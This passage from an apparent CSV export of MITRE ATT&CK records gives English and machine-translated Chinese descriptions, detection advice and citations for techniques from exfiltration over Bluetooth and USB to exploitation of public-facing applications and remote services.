Monitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1011,,,,,,,,,"(Citation: Symantec Beetlejuice),",通过其他网络介质进行渗透：通过蓝牙进行渗透,攻击者可能会尝试通过蓝牙而不是命令和控制通道来窃取数据。如果指挥和控制网络是有线互联网连接，则攻击者可能会选择使用蓝牙通信通道窃取数据。如果对手有足够的访问权限和接近度，他们可能会选择这样做。蓝牙连接可能不像主要的 Internet 连接通道那样受到保护或保护，因为它不是通过同一个企业网络进行路由的。
T1052,Exfiltration Over Physical Medium,"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",https://attack.mitre.org/techniques/T1052,31 May 2017,15 October 2021,1.2,Exfiltration,Monitor file access on removable media. Detect processes that execute when removable media are mounted.,"Linux, Windows, macOS","Command: Command Execution, Drive: Drive Creation, File: File Access, Process: Process Creation",False,,,William Cain,,,Presence of physical medium or device,,,,",(Citation: TechNet Removable Media Control),(Citation: Microsoft Disable Autorun)",物理介质窃取,攻击者可能会尝试通过物理介质（例如可移动驱动器）窃取数据。在某些情况下，例如气隙网络泄露，可能会通过用户引入的物理介质或设备发生渗漏。此类媒体可以是外部硬盘驱动器、USB 驱动器、蜂窝电话、MP3 播放器或其他可移动存储和处理设备。物理介质或设备可用作最终渗出点或在其他断开连接的系统之间跳跃。
T1052.001,Exfiltration Over Physical Medium: Exfiltration over USB,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",https://attack.mitre.org/techniques/T1052/001,11 March 2020,15 October 2021,1.1,Exfiltration,Monitor file access on removable media. Detect processes that execute when removable media are mounted.,"Linux, Windows, macOS","Command: Command Execution, Drive: Drive Creation, File: File Access, Process: Process Creation",True,T1052,,William Cain,,,Presence of physical medium or device,,,,"(Citation: ESET Machete July 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Securelist Agent.btz),(Citation: FireEye APT30),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Avira Mustang Panda January 2020),(Citation: Securelist Machete Aug 2014),(Citation: ESET Sednit USBStealer 2014),(Citation: TechNet Removable Media Control),(Citation: Microsoft Disable Autorun)",物理介质窃取：USB 上的渗透,攻击者可能会尝试通过 USB 连接的物理设备窃取数据。在某些情况下，例如气隙网络入侵，可能会通过用户引入的 USB 设备发生渗漏。 USB 设备可用作最终渗透点或在其他断开连接的系统之间跳转。
T1567,Exfiltration Over Web Service,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.

Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",https://attack.mitre.org/techniques/T1567,09 March 2020,19 October 2022,1.2,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,William Cain,,,,,,,"(Citation: MalwareBytes Ngrok February 2020),(Citation: KISA Operation Muzabi),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: BleepingComputer Molerats Dec 2020),",通过 Web 服务进行窃取,攻击者可能使用现有的合法外部 Web 服务而不是他们的主要命令和控制通道来窃取数据。由于网络中的主机可能在受到攻击之前已经与它们进行通信，因此充当渗漏机制的流行 Web 服务可能会提供大量掩护。防火墙规则也可能已经存在以允许到这些服务的流量。 Web 服务提供商通常也使用 SSL/TLS 加密，为攻击者提供更高级别的保护。
T1567.002,Exfiltration Over Web Service: Exfiltration to Cloud Storage,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.

Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",https://attack.mitre.org/techniques/T1567/002,09 March 2020,30 August 2022,1.1,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1567,,,,,,,,,"(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Github PowerShell Empire),(Citation: Rclone),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Microsoft POLONIUM June 2022),(Citation: ESET Crutch December 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET ComRAT May 2020),(Citation: FireEye Periscope March 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: ESET Lazarus Jun 2020),(Citation: Symantec Waterbug Jun 2019),(Citation: ESET Nomadic Octopus 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: Talos Kimsuky Nov 2021),(Citation: Bitdefender Naikon April 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Microsoft HAFNIUM March 2020),(Citation: FireEye APT29),(Citation: NCC Group Chimera January 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: Checkpoint IndigoZebra July 2021),(Citation: DFIR Conti Bazar Nov 2021),",通过 Web 服务进行窃取：向云存储渗透,攻击者可能会将数据泄露到云存储服务，而不是通过他们的主要命令和控制通道。云存储服务允许通过 Internet 从远程云存储服务器存储、编辑和检索数据。云存储服务的示例包括 Dropbox 和 Google Docs。如果网络中的主机已经在与服务进行通信，那么对这些云存储服务的渗透可以为攻击者提供大量掩护。
T1567.001,Exfiltration Over Web Service: Exfiltration to Code Repository,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.

Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. ",https://attack.mitre.org/techniques/T1567/001,09 March 2020,28 March 2020,1.0,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1567,,,,,,,,,"(Citation: Github PowerShell Empire),",通过 Web 服务进行窃取：渗入代码存储库,攻击者可能会将数据泄露到代码存储库，而不是通过他们的主要命令和控制通道。代码存储库通常可以通过 API 访问（例如：https://api.github.com）。对这些 API 的访问通常通过 HTTPS 进行，这为攻击者提供了额外的保护级别。如果它是网络内主机已经使用的流行服务，那么渗透到代码存储库也可以为对手提供大量掩护。
T1190,Exploit Public-Facing Application,"Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). 

If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.

For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",https://attack.mitre.org/techniques/T1190,18 April 2018,19 April 2022,2.3,Initial Access,"Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","Containers, IaaS, Linux, Network, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content",False,,,"Praetorian; Yossi Weizman, Azure Defender Research Team",,,,,,,"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Microsoft GALLIUM December 2019),(Citation: CISA SoreFang July 2016),(Citation: Volexity SolarWinds),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Secureworks REvil September 2019),(Citation: Microsoft NICKEL December 2021),(Citation: Check Point Havij Analysis),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Tarrask scheduled task),(Citation: FoxIT Wocao December 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: RedCanary Mockingbird May 2020),(Citation: Cybereason PowerLess February 2022),(Citation: Talos Rocke August 2018),(Citation: sqlmap Introduction),(Citation: McAfee Night Dragon),(Citation: TrendMicro BlackTech June 2017),(Citation: Unit 42 Rocke January 2019),(Citation: Unit 42 Siloscape Jun 2021),(Citation: NCSC APT29 July 2020),(Citation: FireEye Exchange Zero Days March 2021),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Cybereason Soft Cell June 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Talos ZxShell Oct 2014),(Citation: Volexity Exchange Marauder March 2021),(Citation: Novetta-Axiom),(Citation: Microsoft HAFNIUM March 2020),(Citation: Securelist APT10 March 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: FireEye APT41 March 2020),(Citation: Dragos PARISITE ),(Citation: KISA Operation Muzabi),(Citation: Symantec Chafer February 2018),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Cisco Group 72),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: ClearkSky Fox Kitten February 2020),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: CrowdStrike PIONEER KITTEN August 2020),(Citation: OWASP Top 10)",利用互联网上的应用程序漏洞,攻击者可能会试图利用面向 Internet 的计算机或程序中的弱点，使用软件、数据或命令来导致意外或意外行为。系统中的弱点可能是错误、故障或设计漏洞。这些应用程序通常是网站，但可以包括数据库（如 SQL）、标准服务（如 SMB 或 SSH）、网络设备管理和管理协议（如 SNMP 和 Smart Install）以及任何其他具有 Internet 可访问开放套接字的应用程序，例如Web 服务器和相关服务。（引用：NVD CVE-2016-6662）（引用：CIS 多个 SMB 漏洞）（引用：US-CERT TA18-106A 网络基础设施设备 2018）（引用：思科博客传统设备攻击）（引用： NVD CVE-2014-7169）根据被利用的漏洞，这可能包括[防御规避利用]（https://attack.mitre.org/techniques/T1211）。如果应用程序托管在基于云的基础架构上和/或容器化，那么利用它可能会导致底层实例或容器受到损害。这可以让攻击者获得访问云或容器 API 的路径，通过 [Escape to Host](https://attack.mitre.org/techniques/T1611) 利用容器主机访问，或利用弱身份和访问管理政策。对于网站和数据库，OWASP 前 10 名和 CWE 前 25 名突出了最常见的基于 Web 的漏洞。（引用：OWASP 前 10 名）（引用：CWE 前 25 名）
T1203,Exploitation for Client Execution,"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

Several types exist:

### Browser-based Exploitation

Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

### Office Applications

Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

### Common Third-party Applications

Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",https://attack.mitre.org/techniques/T1203,18 April 2018,18 April 2022,1.4,Execution,"Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.","Linux, Windows, macOS","Application Log: Application Log Content, Process: Process Creation",False,,,,,0.0,Remote exploitation for execution requires a remotely accessible service reachable over the network or other vector of access such as spearphishing or drive-by compromise.,,,,"(Citation: Uptycs Confucius APT Jan 2021),(Citation: FSI Andariel Campaign Rifle July 2017),(Citation: Splunk Supernova Jan 2021),(Citation: Cylance Shaheen Nov 2018),(Citation: Symantec Inception Framework March 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: McAfee Bankshot),(Citation: Talos Cobalt Strike September 2020),(Citation: Symantec Tick Apr 2016),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Trend Micro Tick November 2019),(Citation: Unit 42 Inception November 2018),(Citation: ESET OceanLotus Mar 2019),(Citation: Symantec Elderwood Sept 2012),(Citation: FireEye Clandestine Fox),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Securelist ScarCruft Jun 2016),(Citation: MSTIC NOBELIUM May 2021),(Citation: Volexity Patchwork June 2018),(Citation: Securelist Dropping Elephant),(Citation: Gigamon Berserk Bear October 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Proofpoint TA459 April 2017),(Citation: FireEye admin@338),(Citation: Unit42 Xbash Sept 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ClearSky MuddyWater June 2019),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: Unit 42 BackConfig May 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Talos Bisonal Mar 2020),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: FireEye Periscope March 2018),(Citation: Antiy CERT Ramsay April 2020),(Citation: TrendMicro New Andariel Tactics July 2018),(Citation: FireEye Clandestine Wolf),(Citation: Talos Bisonal 10 Years March 2020),(Citation: Accenture MUDCARP March 2019),(Citation: Cymmetria Patchwork),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Cyble Sidewinder September 2020),(Citation: PaloAlto Patchwork Mar 2018),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Cyphort EvilBunny Dec 2014),(Citation: RiskIQ Cobalt Jan 2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Eset Ramsay May 2020),(Citation: Cylance Dust Storm),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: FireEye APT37 Feb 2018),(Citation: Trend Micro IXESHE 2012),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: McAfee Sandworm November 2013),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Symantec Elfin Mar 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Talos Group123),(Citation: PTSecurity Higaisa 2020),(Citation: ATT Sidewinder January 2021),(Citation: ESET InvisiMole June 2020),(Citation: Microsoft Holmium June 2020),(Citation: Carnegie Mellon University Supernova Dec 2020),(Citation: Cisco Group 72),(Citation: F-Secure The Dukes),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: TrendMicro Sandworm October 2014),(Citation: Sofacy DealersChoice),(Citation: IssueMakersLab Andariel GoldenAxe May 2017),(Citation: Microsoft DUBNIUM June 2016),(Citation: Talos Frankenstein June 2019),(Citation: iSight Sandworm Oct 2014),(Citation: TrendMicro BlackTech June 2017),(Citation: RiskIQ Cobalt Nov 2017),(Citation: Crowdstrike Global Threat Report Feb 2018),(Citation: Proofpoint Cobalt June 2017),(Citation: Symantec Patchwork),(Citation: FireEye APT41 Aug 2019),(Citation: Proofpoint Leviathan Oct 2017),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Talos Cobalt Group July 2018),(Citation: Moran 2014),(Citation: TrendMicro Tonto Team October 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Trend Micro Xbash Sept 2018),(Citation: Securelist Sofacy Feb 2018),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: TechNet Moving Beyond EMET),(Citation: Wikipedia Control Flow Integrity),(Citation: Windows Blogs Microsoft Edge Sandbox),(Citation: Ars Technica Pwn2Own 2017 VM Escape)",利用客户端漏洞执行/利用客户端漏洞获取执行权限,攻击者可能会利用客户端应用程序中的软件漏洞来执行代码。由于可能导致意外行为的不安全编码实践，软件中可能存在漏洞。攻击者可以通过有针对性地利用某些漏洞来执行任意代码。通常，攻击性工具包最有价值的漏洞利用是那些可用于在远程系统上获取代码执行的漏洞，因为它们可用于访问该系统。用户希望看到与他们常用的工作应用程序相关的文件，因此它们是漏洞利用研究和开发的有用目标，因为它们具有很高的实用性。存在几种类型：### 基于浏览器的利用 Web 浏览器是通过 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) 和 [Spearphishing Link](https://attack) 的常见目标.mitre.org/techniques/T1566/002）。终端系统可能会通过正常的网络浏览或某些用户被钓鱼电子邮件中的链接所攻击，这些用户指向用于利用网络浏览器的攻击者控制的站点。这些通常不需要用户采取行动来执行漏洞利用。 ### Office 应用程序 常见的办公和生产力应用程序（例如 Microsoft Office）也通过 [网络钓鱼](https://attack.mitre.org/techniques/T1566) 成为攻击目标。恶意文件将作为附件直接传输或通过链接下载。这些要求用户打开文档或文件以运行漏洞利用。 ### 常见的第三方应用程序 其他常见的应用程序或部署在目标网络中的软件的一部分也可能被用于利用。企业环境中常见的 Adobe Reader 和 Flash 等应用程序经常成为试图访问系统的攻击者的目标。根据漏洞的软件和性质，有些可能会在浏览器中被利用或需要用户打开文件。例如，一些 Flash 漏洞利用已作为 Microsoft Office 文档中的对象传递。
T1212,Exploitation for Credential Access,"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",https://attack.mitre.org/techniques/T1212,18 April 2018,28 April 2022,1.4,Credential Access,"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen.","Linux, Windows, macOS","Application Log: Application Log Content, Process: Process Creation, User Account: User Account Authentication",False,,,"John Lambert, Microsoft Threat Intelligence Center",,,,,,,",(Citation: Wikipedia Control Flow Integrity),(Citation: TechNet Moving Beyond EMET),(Citation: Ars Technica Pwn2Own 2017 VM Escape)",利用漏洞获取凭据访问的权限,攻击者可能会利用软件漏洞来尝试收集凭据。当攻击者利用程序、服务或操作系统软件或内核本身中的编程错误来执行攻击者控制的代码时，就会利用软件漏洞。凭据和身份验证机制可能会被攻击者利用，作为获取有用凭据的访问权限或规避获取系统访问权限的过程的手段。其中一个示例是 MS14-068，它针对 Kerberos，可用于使用域用户权限伪造 Kerberos 票证。（引用：Technet MS14-068）（引用：ADSecurity Detecting Forged Tickets）利用凭据访问也可能导致特权升级取决于目标流程或获得的凭据。
T1211,Exploitation for Defense Evasion,"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.

Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.",https://attack.mitre.org/techniques/T1211,18 April 2018,28 April 2022,1.3,Defense Evasion,"Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery.","Linux, Windows, macOS","Application Log: Application Log Content, Process: Process Creation",False,,"Anti-virus, System access controls","John Lambert, Microsoft Threat Intelligence Center",,,,,,,"(Citation: Microsoft SIR Vol 19),(Citation: Bitdefender APT28 Dec 2015),(Citation: Wikipedia Control Flow Integrity),(Citation: TechNet Moving Beyond EMET),(Citation: Ars Technica Pwn2Own 2017 VM Escape)",利用漏洞进行防御绕过,攻击者可能会利用系统或应用程序漏洞绕过安全功能。当攻击者利用程序、服务或操作系统软件或内核本身中的编程错误来执行攻击者控制的代码时，就会利用软件漏洞。可用于禁用或规避它们的防御性安全软件中可能存在漏洞。攻击者可能通过侦察知道环境中存在安全软件，或者他们可能会在系统受到威胁期间或之后不久执行检查以进行 [安全软件发现] (https://attack.mitre.org/techniques/T1518/001) .安全软件可能会直接成为利用的目标。有一些防病毒软件被持续威胁组攻击以逃避检测的例子。
T1068,Exploitation for Privilege Escalation,"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.

When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.

Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",https://attack.mitre.org/techniques/T1068,31 May 2017,16 June 2022,1.4,Privilege Escalation,"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode.(Citation: Microsoft Driver Block Rules)

Higher privileges are often necessary to perform additional actions such as some methods of [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Look for additional activity that may indicate an adversary has gained higher privileges.","Containers, Linux, Windows, macOS","Driver: Driver Load, Process: Process Creation",False,,,"David Tayouri; Idan Revivo, @idanr86, Team Nautilus Aqua Security; Joas Antonio dos Santos, @C0d3Cr4zy, Inmetrics; Yaniv Agman, @AgmanYaniv, Team Nautilus Aqua Security",User,,,,,User,"(Citation: FireEye Fin8 May 2016),(Citation: FireEye APT32 May 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: trendmicro xcsset xcode project 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: ESET Sednit July 2015),(Citation: Github PowerShell Empire),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: ESET Sednit Part 1),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Profero APT27 December 2020),(Citation: Symantec Whitefly March 2019),(Citation: ESET InvisiMole June 2020),(Citation: Microsoft SIR Vol 19),(Citation: Unit 42 Hildegard Malware),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Group IB Ransomware September 2020),(Citation: Microsoft CVE-2021-1732 Feb 2021),(Citation: Bitdefender APT28 Dec 2015),(Citation: Trend Micro Iron Tiger April 2021),(Citation: TrendMicro Tonto Team October 2020),(Citation: FireEye APT33 Guardrail),(Citation: Novetta-Axiom),(Citation: Check Point APT31 February 2021),(Citation: Microsoft SIR Vol 21),(Citation: GitHub PoshC2),(Citation: FireEye FIN6 April 2016),(Citation: Prevx Carberp March 2011),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: DBAPPSecurity BITTER zero-day Feb 2021),(Citation: Unit42 AcidBox June 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: ESET T3 Threat Report 2021),(Citation: Securelist Sofacy Feb 2018),(Citation: ESET Carberp March 2012),(Citation: F-Secure The Dukes),(Citation: Wikipedia Control Flow Integrity),(Citation: TechNet Moving Beyond EMET),(Citation: Ars Technica Pwn2Own 2017 VM Escape),(Citation: Microsoft Driver Block Rules)",利用漏洞进行提权,攻击者可能会利用软件漏洞来提升权限。当攻击者利用程序、服务或操作系统软件或内核本身中的编程错误来执行攻击者控制的代码时，就会利用软件漏洞。诸如权限级别之类的安全结构通常会阻碍对信息的访问和某些技术的使用，因此攻击者可能需要执行权限升级以包括使用软件利用来规避这些限制。当最初获得对系统的访问权时，攻击者可能在较低特权的进程中运行，这将阻止他们访问系统上的某些资源。可能存在漏洞，通常存在于通常以更高权限运行的操作系统组件和软件中，可以利用这些漏洞获得更高级别的系统访问权限。这可能使某人能够根据易受攻击的组件从非特权或用户级别权限转移到 SYSTEM 或 root 权限。这也可能使攻击者能够从虚拟化环境（例如在虚拟机或容器内）移动到底层主机。这可能是攻击者破坏已正确配置并限制其他权限提升方法的终端系统的必要步骤。攻击者可能会将已签名的易受攻击的驱动程序带到受感染的机器上，以便他们可以利用该漏洞在内核模式下执行代码。此过程有时称为自带易受攻击的驱动程序 (BYOVD)。（引用：ESET InvisiMole 2020 年 6 月）（引用：Unit42 AcidBox 2020 年 6 月）攻击者可能会将易受攻击的驱动程序包含在初始访问期间交付的文件中，或将其下载到受感染的系统通过 [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) 或 [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)。
T1210,Exploitation of Remote Services,"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.

An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.

There are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)

